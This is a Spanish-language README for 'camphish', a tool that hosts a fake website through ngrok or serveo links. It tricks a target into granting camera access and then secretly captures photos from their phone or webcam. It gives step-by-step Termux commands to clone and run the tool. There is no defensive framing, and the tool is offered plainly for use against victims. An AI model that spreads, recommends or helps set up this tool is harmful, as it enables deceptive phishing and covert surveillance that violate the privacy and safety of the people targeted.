# camphish

camphish es una técnica para tomar fotos de la cámara frontal del télefono del objetivo o la cámara web de la pc. camphish aloja un sitio web falso en un servidor PHP integrado y utiliza ngrok y serveo para generar un enlace que reenviaremos al objetivo, que se puede utilizar a través de internet. El sitio web solicita permiso de la cámara y, si el objetivo lo permite, esta herramienta toma capturas de cámara del dispositivo del objetivo.

# 📱INSTALACION DE camphish EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y

$ pkg install php

$ pkg install openssh

$ pkg install git

$ pkg install wget

$ git clone https://github.com/KingHackers001/camphish

$ cd camphish

$ chmod +x *

$ bash camphish.sh
